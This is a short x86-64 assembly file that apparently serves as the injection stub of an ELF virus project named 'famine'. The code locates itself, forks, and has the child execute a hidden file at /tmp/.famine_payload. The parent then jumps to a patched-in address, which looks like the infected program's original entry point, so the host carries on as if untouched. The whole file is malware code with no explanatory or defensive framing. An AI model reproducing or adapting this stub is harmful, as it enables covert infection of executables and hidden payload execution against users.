BITS 64

	call path
path:
	pop rbx
	lea rdi, [rbx + 0x34]
	mov al, 57
	syscall
	test rax, rax
	jne parent
	push 0
	push rdi
	mov rsi, rsp
	xor edx, edx
	mov al, 59
	syscall
	test rax, rax
	jnz clean
parent:
	xor edi, edi
	xor esi, esi
	xor edx, edx
	add rbx, 0xDEADBEEF
	jmp rbx
clean:
	add rsp, 0x10
	jmp parent
payload_path:
	db "/tmp/.famine_payload", 0
